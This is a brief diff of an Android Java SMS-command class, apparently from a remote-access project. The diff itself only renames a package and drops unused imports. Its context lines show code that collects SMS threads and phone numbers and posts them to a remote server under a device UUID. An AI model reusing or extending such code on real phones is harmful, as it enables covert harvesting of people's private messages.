@@ -1,7 +1,6 @@
-package com.c4wd.command;
+package com.c4wd.commands;
 
 import android.os.AsyncTask;
-import android.widget.Toast;
 
 import com.c4wd.larat.Constants;
 import com.c4wd.larat.RestClient;
@@ -15,7 +14,6 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.sql.ResultSet;
 import java.util.List;
 import java.util.UUID;
 
@@ -64,6 +62,7 @@ public class SMSCommands {
                         msg_array.put("number", info.getNumber());
                         messages.put(msg_array);
                     }
+
                     //post our threads to the server, saved under the UUID
                     params.put("command", "sms_thread_list");
                     params.put("message_type", outbox ? "SMS_THREAD_INFO_SENT" : "SMS_THREAD_INFO_INBOX");
